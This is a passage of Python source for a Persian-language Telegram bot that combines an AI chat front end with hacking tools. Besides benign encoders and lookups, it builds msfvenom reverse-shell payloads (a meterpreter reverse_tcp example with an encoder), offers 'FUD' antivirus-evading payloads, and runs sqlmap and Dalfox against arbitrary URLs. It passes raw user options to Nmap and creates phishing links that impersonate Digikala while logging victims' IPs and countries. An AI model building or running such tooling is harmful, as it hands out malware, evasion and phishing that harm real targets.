        for line in lines:
            if line.startswith('عنوان:') or line.startswith('Title:'): title = line.split(':',1)[1].strip()
            elif line.startswith('برچسب:') or line.startswith('Tags:'): tags = line.split(':',1)[1].strip()
        content = full_text; file_type = "text"
    else: bot.reply_to(message, "❌ فرمت پشتیبانی نمی‌شود."); return
    if not tags and content:
        try: tags = ask_groq(f"فقط ۳ برچسب (با کاما جدا) برای: {content[:500]}", 50).replace(".","").strip()
        except: tags = ""
    db_execute("INSERT INTO library (title, content, file_type, file_path, uploaded_by, uploaded_at, tags) VALUES (?,?,?,?,?,?,?)",
               (title, content, file_type, file_path, user_id, datetime.now().isoformat(), tags))
    bot.reply_to(message, f"✅ «{title}» با برچسب‌های «{tags}» ذخیره شد ✨")

@bot.callback_query_handler(func=lambda call: call.data == "security_tools")
def security_tools_menu(call):
    reset_state_on_menu(call)
    markup = InlineKeyboardMarkup(row_width=1)
    markup.add(
        InlineKeyboardButton("🔐 رمزنگاری و هش", callback_data="crypto_menu"),
        InlineKeyboardButton("🩸 بررسی لو رفتن رمز", callback_data="hibp_check"),
        InlineKeyboardButton("🛡️ جستجوی CVE", callback_data="cve_search"),
        InlineKeyboardButton("🌐 زیردامنه‌یاب", callback_data="subdomain_menu"),
        InlineKeyboardButton("🔙 برگشت", callback_data="back_to_main")
    )
    bot.edit_message_text("🛠️ **ابزارهای امنیتی**\nلطفاً یکی را انتخاب کن:", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "crypto_menu")
def crypto_menu(call):
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(
        InlineKeyboardButton("Base64 Encode", callback_data="crypto_base64_encode"),
        InlineKeyboardButton("Base64 Decode", callback_data="crypto_base64_decode"),
        InlineKeyboardButton("URL Encode", callback_data="crypto_url_encode"),
        InlineKeyboardButton("URL Decode", callback_data="crypto_url_decode"),
        InlineKeyboardButton("Hex Encode", callback_data="crypto_hex_encode"),
        InlineKeyboardButton("Hex Decode", callback_data="crypto_hex_decode"),
        InlineKeyboardButton("HTML Escape", callback_data="crypto_html_escape"),
        InlineKeyboardButton("HTML Unescape", callback_data="crypto_html_unescape"),
        InlineKeyboardButton("ROT13", callback_data="crypto_rot13"),
        InlineKeyboardButton("MD5", callback_data="crypto_md5"),
        InlineKeyboardButton("SHA1", callback_data="crypto_sha1"),
        InlineKeyboardButton("SHA256", callback_data="crypto_sha256"),
        InlineKeyboardButton("SHA512", callback_data="crypto_sha512"),
        InlineKeyboardButton("🔍 شناسایی هش", callback_data="crypto_hash_identify"),
        InlineKeyboardButton("🔙 برگشت", callback_data="security_tools")
    )
    bot.edit_message_text("🔐 **رمزنگاری و هش**\nیک عملیات را انتخاب کن:", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data.startswith("crypto_"))
def crypto_action(call):
    action = call.data.replace("crypto_", "")
    if action in ["hash_identify"]:
        bot.send_message(call.message.chat.id, f"🔍 لطفاً هش مورد نظر را بفرست:")
        bot.register_next_step_handler(call.message, lambda m: crypto_process(m, action))
    else:
        bot.send_message(call.message.chat.id, f"📝 متن را بفرست تا {action} انجام دهم:")
        bot.register_next_step_handler(call.message, lambda m: crypto_process(m, action))
    bot.answer_callback_query(call.id)

def crypto_process(message, action):
    if not is_text_message(message):
        bot.reply_to(message, "❌ لطفاً متن ارسال کنید."); return
    text = message.text.strip()
    if not text:
        bot.reply_to(message, "❌ متن نمی‌تواند خالی باشد ✨"); return
    result = crypto_hash_text(text, action)
    bot.reply_to(message, f"✅ **{action}:**\n```\n{result}\n```", parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "hibp_check")
def hibp_prompt(call):
    bot.send_message(call.message.chat.id, "🔑 رمز عبور مورد نظر را بفرست (توصیه می‌شود در محیط امن تست شود):")
    bot.register_next_step_handler(call.message, hibp_process)
    bot.answer_callback_query(call.id)

def hibp_process(message):
    if not is_text_message(message):
        bot.reply_to(message, "❌ لطفاً متن ارسال کنید."); return
    password = message.text.strip()
    if not password:
        bot.reply_to(message, "❌ رمز عبور نمی‌تواند خالی باشد ✨"); return
    bot.send_chat_action(message.chat.id, 'typing')
    leaked, count = hibp_check_password(password)
    if leaked is None:
        bot.reply_to(message, f"❌ خطا: {count}")
    elif leaked:
        bot.reply_to(message, f"⚠️ این رمز عبور **{count}** بار در دامپ‌های عمومی لو رفته است! آن را تغییر دهید.")
    else:
        bot.reply_to(message, "✅ این رمز عبور در پایگاه‌های داده لو رفته یافت نشد (امن‌تر است).")

@bot.callback_query_handler(func=lambda call: call.data == "cve_search")
def cve_search_prompt(call):
    bot.send_message(call.message.chat.id, "🔍 یک کلمه کلیدی یا شناسه CVE را وارد کن (مثل `CVE-2021-44228` یا `Apache Log4j`):")
    bot.register_next_step_handler(call.message, cve_search_process)
    bot.answer_callback_query(call.id)

def cve_search_process(message):
    if not is_text_message(message):
        bot.reply_to(message, "❌ لطفاً متن ارسال کنید."); return
    query = message.text.strip()
    if not query:
        bot.reply_to(message, "❌ عبارت جستجو نمی‌تواند خالی باشد ✨"); return
    bot.send_chat_action(message.chat.id, 'typing')
    results = search_cve(query)
    if not results:
        bot.reply_to(message, "❌ نتیجه‌ای یافت نشد ✨"); return
    msg = f"🛡️ **نتایج CVE برای `{query}`:**\n\n"
    for r in results:
        msg += f"**{r['cve_id']}**\n{r['summary']}\n🔗 [Exploit-DB]({r['exploit_db_link']})\n\n"
    bot.reply_to(message, msg, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "subdomain_menu")
def subdomain_menu(call):
    markup = InlineKeyboardMarkup(row_width=1)
    markup.add(
        InlineKeyboardButton("crt.sh", callback_data="subdomain_crt"),
        InlineKeyboardButton("Anubis", callback_data="subdomain_anubis"),
        InlineKeyboardButton("AlienVault OTX", callback_data="subdomain_otx"),
        InlineKeyboardButton("🔙 برگشت", callback_data="security_tools")
    )
    bot.edit_message_text("🌐 **زیردامنه‌یاب**\nمنبع را انتخاب کن:", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data.startswith("subdomain_"))
def subdomain_source(call):
    source = call.data.replace("subdomain_", "")
    bot.send_message(call.message.chat.id, f"🔗 دامنه را وارد کن (بدون http://):")
    bot.register_next_step_handler(call.message, lambda m: subdomain_process(m, source))
    bot.answer_callback_query(call.id)

def subdomain_process(message, source):
    if not is_text_message(message):
        bot.reply_to(message, "❌ لطفاً متن ارسال کنید."); return
    domain = clean_target(message.text.strip())
    if not domain:
        bot.reply_to(message, "❌ دامنه نمی‌تواند خالی باشد ✨"); return
    bot.send_chat_action(message.chat.id, 'typing')
    subs = passive_subdomain_enum(domain, source)
    if not subs or (isinstance(subs, list) and len(subs) == 1 and subs[0].startswith("خطا")):
        bot.reply_to(message, f"❌ نتیجه‌ای یافت نشد: {subs[0] if subs else 'نامشخص'}")
        return
    msg = f"🌐 **زیردامنه‌های `{domain}` ({source}):**\n\n" + "\n".join(f"• {s}" for s in subs[:20])
    if len(subs) > 20:
        msg += f"\n... و {len(subs)-20} زیردامنه دیگر"
    bot.reply_to(message, msg, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "web_tech")
def web_tech_prompt(call):
    bot.send_message(call.message.chat.id, "🌐 آدرس سایت را وارد کنید (مثال: example.com):")
    bot.register_next_step_handler(call.message, web_tech_process)
    bot.answer_callback_query(call.id)

def web_tech_process(message):
    if not is_text_message(message):
        bot.reply_to(message, "❌ لطفاً متن ارسال کنید."); return
    url = message.text.strip()
    if not url: bot.reply_to(message, "❌ آدرس معتبر نیست ✨"); return
    bot.send_chat_action(message.chat.id, 'typing')
    result = web_tech_detect(url)
    bot.reply_to(message, result, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "generate_report")
def report_prompt(call):
    bot.send_message(call.message.chat.id, "📊 یک هدف خاص وارد کن (یا /skip برای همه):")
    bot.register_next_step_handler(call.message, report_process)
    bot.answer_callback_query(call.id)

def report_process(message):
    if not is_text_message(message):
        bot.reply_to(message, "❌ لطفاً متن ارسال کنید."); return
    target = message.text.strip()
    if target.lower() == "/skip":
        target = None
    else:
        target = clean_target(target)
    user_id = message.from_user.id
    bot.send_chat_action(message.chat.id, 'upload_document')
    file_path = generate_pentest_report(user_id, target)
    if file_path:
        with open(file_path, 'rb') as f:
            bot.send_document(message.chat.id, f, caption="📊 گزارش پنتست شما")
        os.unlink(file_path)
    else:
        bot.reply_to(message, "❌ داده‌ای برای گزارش موجود نیست ✨")

@bot.callback_query_handler(func=lambda call: call.data == "port_scanner")
def port_scanner_menu(call):
    markup = InlineKeyboardMarkup(row_width=1)
    markup.add(
        InlineKeyboardButton("اسکن سریع (سوکت)", callback_data="port_quick"),
        InlineKeyboardButton("اسکن Nmap (حرفه‌ای)", callback_data="port_nmap"),
        InlineKeyboardButton("🔙 برگشت", callback_data="back_to_main")
    )
    bot.edit_message_text("🔌 **اسکنر پورت**\nنوع اسکن را انتخاب کن:", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "port_quick")
def port_quick_prompt(call):
    bot.send_message(call.message.chat.id, "🎯 IP یا دامنه هدف را وارد کن:")
    bot.register_next_step_handler(call.message, port_quick_process)
    bot.answer_callback_query(call.id)

def port_quick_process(message):
    if not is_text_message(message):
        bot.reply_to(message, "❌ لطفاً متن ارسال کنید."); return
    target = clean_target(message.text.strip())
    if not target: bot.reply_to(message, "❌ هدف معتبر نیست ✨"); return
    try:
        ip = socket.gethostbyname(target)
    except:
        bot.reply_to(message, "❌ دامنه یا IP نامعتبر است."); return
    bot.send_chat_action(message.chat.id, 'typing')
    open_ports = port_scanner(ip)
    if open_ports:
        msg = "🔓 **پورت‌های باز:**\n" + "\n".join(f"• {p}" for p in open_ports)
    else:
        msg = "❌ هیچ پورت بازی پیدا نشد."
    bot.reply_to(message, msg)

@bot.callback_query_handler(func=lambda call: call.data == "port_nmap")
def port_nmap_prompt(call):
    bot.send_message(call.message.chat.id, "🎯 IP یا دامنه هدف را وارد کن (و در صورت نیاز آپشن‌های Nmap با -):\nمثال: `192.168.1.1 -sS -p-`")
    bot.register_next_step_handler(call.message, port_nmap_process)
    bot.answer_callback_query(call.id)

def port_nmap_process(message):
    if not is_text_message(message):
        bot.reply_to(message, "❌ لطفاً متن ارسال کنید."); return
    parts = message.text.strip().split(maxsplit=1)
    target = clean_target(parts[0])
    options = parts[1] if len(parts) > 1 else "-sV -T4"
    if not target: bot.reply_to(message, "❌ هدف معتبر نیست ✨"); return
    bot.send_chat_action(message.chat.id, 'typing')
    result = nmap_scan(target, options)
    if result is None:
        bot.reply_to(message, "❌ Nmap روی سرور نصب نیست.")
    else:
        bot.reply_to(message, result[:4000])

@bot.callback_query_handler(func=lambda call: call.data == "xss_sqlmap")
def xss_sqlmap_menu(call):
    markup = InlineKeyboardMarkup(row_width=1)
    markup.add(
        InlineKeyboardButton("🔥 XSS با Dalfox", callback_data="run_dalfox"),
        InlineKeyboardButton("💉 SQL Injection با SQLMap", callback_data="run_sqlmap"),
        InlineKeyboardButton("🔙 برگشت", callback_data="back_to_main")
    )
    bot.edit_message_text("⚠️ **ابزارهای تهاجمی**\nفقط روی اهداف مجاز استفاده شود:", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "run_dalfox")
def dalfox_prompt(call):
    bot.send_message(call.message.chat.id, "🎯 آدرس هدف (با پارامتر) را وارد کن:\nمثال: `https://example.com/?q=test`")
    bot.register_next_step_handler(call.message, dalfox_process)
    bot.answer_callback_query(call.id)

def dalfox_process(message):
    if not is_text_message(message):
        bot.reply_to(message, "❌ لطفاً متن ارسال کنید."); return
    url = message.text.strip()
    if not url: bot.reply_to(message, "❌ آدرس معتبر نیست ✨"); return
    bot.send_chat_action(message.chat.id, 'typing')
    output = run_dalfox(url)
    if len(output) > 4000:
        output = output[:4000] + "\n... (خروجی کوتاه شد)"
    bot.reply_to(message, output)

@bot.callback_query_handler(func=lambda call: call.data == "run_sqlmap")
def sqlmap_prompt(call):
    bot.send_message(call.message.chat.id, "🎯 آدرس هدف (با پارامتر) را وارد کن (و در صورت نیاز آپشن‌های اضافه):\nمثال: `https://example.com/?id=1 --dbs`")
    bot.register_next_step_handler(call.message, sqlmap_process)
    bot.answer_callback_query(call.id)

def sqlmap_process(message):
    if not is_text_message(message):
        bot.reply_to(message, "❌ لطفاً متن ارسال کنید."); return
    parts = message.text.strip().split(maxsplit=1)
    url = parts[0]
    extra_opts = parts[1] if len(parts) > 1 else ""
    if not url: bot.reply_to(message, "❌ آدرس معتبر نیست ✨"); return
    bot.send_chat_action(message.chat.id, 'typing')
    output = run_sqlmap(url, "--batch --random-agent " + extra_opts)
    if len(output) > 4000:
        output = output[:4000] + "\n... (خروجی کوتاه شد)"
    bot.reply_to(message, output)

@bot.callback_query_handler(func=lambda call: call.data == "payload_gen")
def payload_gen_menu(call):
    markup = InlineKeyboardMarkup(row_width=1)
    markup.add(
        InlineKeyboardButton("ساخت پیلود سفارشی", callback_data="build_payload"),
        InlineKeyboardButton("🔙 برگشت", callback_data="back_to_main")
    )
    bot.edit_message_text("💣 **تولید پیلود**\n⚠️ فقط روی اهداف مجاز:", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "build_payload")
def build_payload_prompt(call):
    msg = """📝 **فرمت:**
`نوع پیلود:آی‌پی:پورت:فرمت:انکودر:تعداد تکرار`
مثال: `windows/x64/meterpreter/reverse_tcp:192.168.1.100:4444:exe:x86/shikata_ga_nai:5`
برای انکودر خالی بذارید `none`
"""
    bot.send_message(call.message.chat.id, msg)
    bot.register_next_step_handler(call.message, payload_build_process)
    bot.answer_callback_query(call.id)

def payload_build_process(message):
    if not is_text_message(message):
        bot.reply_to(message, "❌ لطفاً متن ارسال کنید."); return
    try:
        parts = message.text.strip().split(':')
        payload_type = parts[0]
        lhost = parts[1]
        lport = int(parts[2])
        fmt = parts[3]
        encoder = parts[4] if parts[4].lower() != 'none' else ""
        iterations = int(parts[5]) if len(parts) > 5 else 1
    except:
        bot.reply_to(message, "❌ فرمت اشتباه ✨"); return
    bot.send_chat_action(message.chat.id, 'upload_document')
    file_data = msfvenom_payload(payload_type, lhost, lport, fmt, encoder, iterations)
    if isinstance(file_data, bytes) and (file_data.startswith(b'') or file_data == b''):
        bot.reply_to(message, file_data.decode()); return
    bio = io.BytesIO(file_data)
    bio.name = f"payload.{fmt}"
    bot.send_document(message.chat.id, bio)

@bot.callback_query_handler(func=lambda call: call.data == "auto_pentest")
def auto_pentest_prompt(call):
    bot.send_message(call.message.chat.id, "🎯 هدف (دامنه یا IP) را وارد کن:")
    bot.register_next_step_handler(call.message, auto_pentest_process)
    bot.answer_callback_query(call.id)

def auto_pentest_process(message):
    if not is_text_message(message):
        bot.reply_to(message, "❌ لطفاً متن ارسال کنید."); return
    target = message.text.strip()
    if not target: bot.reply_to(message, "❌ هدف معتبر نیست ✨"); return
    bot.send_chat_action(message.chat.id, 'typing')
    user_id = message.from_user.id
    steps, suggestion = auto_pentest_workflow(target, user_id)
    msg = f"🤖 **تست نفوذ خودکار برای {clean_target(target)}**\n\n"
    for step_name, result in steps:
        msg += f"🔹 **{step_name}:**\n{result[:200]}\n\n"
    msg += f"🧠 **پیشنهاد Groq:**\n{suggestion}\n\n"
    msg += "برای اجرای پیشنهاد، از ابزارهای مربوطه استفاده کنید."
    bot.reply_to(message, msg, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "fud_payload")
def fud_payload_prompt(call):
    markup = InlineKeyboardMarkup(row_width=1)
    markup.add(
        InlineKeyboardButton("ویندوز", callback_data="fud_windows"),
        InlineKeyboardButton("لینوکس", callback_data="fud_linux"),
        InlineKeyboardButton("🔙 برگشت", callback_data="back_to_main")
    )
    bot.edit_message_text("💣 **تولید پیلود FUD**\nپلتفرم هدف:", call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data.startswith("fud_"))
def fud_platform(call):
    platform = call.data.replace("fud_", "")
    result = generate_fud_payload(platform)
    bot.send_message(call.message.chat.id, result, parse_mode="Markdown")
    bot.answer_callback_query(call.id)

@bot.callback_query_handler(func=lambda call: call.data == "search_web")
def search_web_prompt(call):
    bot.send_message(call.message.chat.id, "🔍 **جستجوی وب**\nلطفاً عبارت جستجو را وارد کنید (مثال: `پایتون چیست`):")
    bot.register_next_step_handler(call.message, search_web_step)
    bot.answer_callback_query(call.id)

def search_web_step(message):
    if not is_text_message(message):
        bot.reply_to(message, "❌ لطفاً متن ارسال کنید."); return
    query = message.text.strip()
    if not query:
        bot.reply_to(message, "❌ عبارت جستجو نمی‌تواند خالی باشد ✨")
        return
    bot.send_chat_action(message.chat.id, 'typing')
    results = web_search(query)
    if not results:
        bot.reply_to(message, "❌ نتیجه‌ای یافت نشد ✨")
        return
    msg = f"🔍 **نتایج جستجو برای `{query}`:**\n\n"
    for i, r in enumerate(results, 1):
        msg += f"**{i}. {r['title']}**\n"
        if r['url']:
            msg += f"🔗 {r['url']}\n"
        if r['snippet']:
            msg += f"📝 {r['snippet']}\n"
        msg += "\n"
    bot.reply_to(message, msg, parse_mode="Markdown")

def web_search(query, max_results=5):
    try:
        url = f"https://html.duckduckgo.com/html/?q={urllib.parse.quote(query)}"
        headers = {"User-Agent": "Mozilla/5.0"}
        r = http_session.get(url, headers=headers, timeout=10)
        soup = BeautifulSoup(r.text, 'html.parser')
        results = []
        for item in soup.select('.result')[:max_results]:
            title_elem = item.select_one('.result__title')
            link_elem = item.select_one('.result__url')
            snippet_elem = item.select_one('.result__snippet')
            if title_elem:
                results.append({
                    'title': title_elem.get_text(strip=True),
                    'url': link_elem.get('href') if link_elem else '',
                    'snippet': snippet_elem.get_text(strip=True) if snippet_elem else ''
                })
        return results
    except: return []

@bot.callback_query_handler(func=lambda call: call.data == "tg_profile")
def tg_profile_prompt(call):
    bot.send_message(call.message.chat.id, "🔍 یک یوزرنیم (با @) یا شناسه عددی وارد کن:")
    bot.register_next_step_handler(call.message, tg_profile_process)
    bot.answer_callback_query(call.id)

def tg_profile_process(message):
    if not is_text_message(message):
        bot.reply_to(message, "❌ لطفاً متن ارسال کنید."); return
    query = message.text.strip()
    if not query:
        bot.reply_to(message, "❌ یوزرنیم یا شناسه معتبر نیست ✨"); return
    bot.send_chat_action(message.chat.id, 'typing')
    result = tg_profile_inspector(query)
    bot.reply_to(message, result, parse_mode="Markdown")

@bot.message_handler(commands=['tg'])
def tg_command(message):
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "🔍 **Telegram Profile Inspector**\nمثال: `/tg @username` یا `/tg 123456789`")
        return
    query = parts[1].strip()
    bot.send_chat_action(message.chat.id, 'typing')
    result = tg_profile_inspector(query)
    bot.reply_to(message, result, parse_mode="Markdown")

@bot.message_handler(commands=['phish_create'])
def phish_create_cmd(message):
    parts = message.text.split(maxsplit=1)
    code = parts[1].strip() if len(parts)>1 else secrets.token_urlsafe(4)[:6]
    if not re.match(r'^[a-zA-Z0-9_-]{3,20}$', code):
        bot.reply_to(message, "❌ کد نامعتبر."); return
    db_execute("INSERT INTO links (code, user_id, template, target_url, created_at) VALUES (?,?,?,?,?)",
               (code, message.from_user.id, "digikala", "https://www.digikala.com", datetime.now().isoformat()))
    bot.reply_to(message, f"✅ لینک فیشینگ:\n`{PUBLIC_URL}/osint/l/{code}`", parse_mode="Markdown")

@bot.message_handler(commands=['phish_list'])
def phish_list_cmd(message):
    links = db_fetch_all("SELECT * FROM links WHERE user_id=? ORDER BY created_at DESC", (message.from_user.id,))
    if not links: bot.reply_to(message, "لینکی نداری.")
    else:
        msg = "🔗 لینک‌های تو:\n"
        for l in links: msg += f"کد: {l['code']} | بازدید: {l['visits']}\n"
        bot.reply_to(message, msg)

@bot.message_handler(commands=['phish_stats'])
def phish_stats_cmd(message):
    victims = db_fetch_all("SELECT * FROM victims WHERE created_by=? ORDER BY id DESC LIMIT 20", (message.from_user.id,))
    if not victims: bot.reply_to(message, "داده‌ای ثبت نشده.")
    else:
        msg = "📊 آخرین قربانیان:\n"
        for v in victims[:10]: msg += f"🕒 {v['timestamp'][:16]} | IP: {v['ip']} | {v['country']}\n"
        bot.reply_to(message, msg)

@bot.message_handler(commands=['search'])
def search_command(message):
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "🔍 **WebSearch**\nلطفاً عبارت جستجو را وارد کنید:\nمثال: `/search پایتون چیست`")
        return
    query = parts[1].strip()
    bot.send_chat_action(message.chat.id, 'typing')
    results = web_search(query)
    if not results: bot.reply_to(message, "❌ نتیجه‌ای یافت نشد ✨"); return
    msg = f"🔍 **نتایج جستجو برای `{query}`:**\n\n"
    for i, r in enumerate(results, 1):
        msg += f"**{i}. {r['title']}**\n"
        if r['url']: msg += f"🔗 {r['url']}\n"
        if r['snippet']: msg += f"📝 {r['snippet']}\n"
        msg += "\n"
    bot.reply_to(message, msg, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "help_guide")
def help_guide(call):
    bot.send_message(call.message.chat.id, "✨ **راهنمای کامل** ✨\n\n🔹 Groq AI\n🔹 اینترنت آزاد (CDN یاب, اسکنر)\n🔹 پنتست (Whois, DNS, Subdomain, Port, SSL, Dir Brute, Full Scan)\n🔹 OSINT (فیشینگ)\n🔹 Shadowgram, DeepEye, WhisperTrace, SmartQuery\n🔹 کتابخانه آموزشی\n🔹 ابزارهای امنیتی (رمزنگاری, HIBP, CVE, زیردامنه‌یاب)\n🔹 شناسایی فناوری وب, گزارش پنتست, اسکنر پورت, XSS/SQLMap, تولید پیلود, تست نفوذ خودکار, FUD Payload, جستجوی وب\n🔹 پروفایل تلگرام", parse_mode="Markdown")
    bot.answer_callback_query(call.id)

@bot.message_handler(func=lambda m: True, content_types=['text'])
def handle_text_messages(message):
    if message.text and not message.text.startswith('/'):
        if not should_respond(message): return
        bot.send_chat_action(message.chat.id, 'typing')
        bot.reply_to(message, ask_groq(message.text))

if __name__ == "__main__":
    bot.remove_webhook()
    time.sleep(1)
    bot.set_webhook(url=WEBHOOK_URL + '/webhook')
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)